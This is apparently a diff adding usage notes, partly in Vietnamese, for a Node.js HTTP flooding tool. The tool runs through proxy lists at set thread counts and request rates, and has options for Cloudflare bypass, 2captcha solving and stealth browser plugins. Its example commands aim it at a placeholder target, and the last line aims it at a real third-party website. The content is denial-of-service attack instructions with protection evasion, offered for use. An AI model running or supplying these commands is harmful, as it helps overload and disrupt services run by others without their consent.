@@ -1,0 +1,18 @@
+
+# Terminal mode (giờ có rps/ok/fail/lat/p95)
+node tool.js -u https://target.com -p proxies.txt -s 300 -t 8 -r 100
+
+# Web dashboard
+node tool.js -u https://target.com -p proxies.txt -s 300 -t 8 -r 100 --dashboard 8080
+# → http://localhost:8080
+
+# Full combo + dashboard
+node tool.js -u https://target.com -p proxies.txt \
+  -m POST -D "a=b" -s 600 -t 16 -r 200 \
+  --full true --extra true --rand-rate 150-250 \
+  --bypass-cf true --captcha-key YOUR_KEY \
+  --dashboard 8080
+
+npm i commander colors socks hpack puppeteer-extra puppeteer-extra-plugin-stealth 2captcha
+
+node tool.js -u https://www.garena.vn/ -p proxies_safe.txt -s 120 -t 2 -r 30 --conns 5 --rand-rate 10-25 -v 1 --ratelimit true
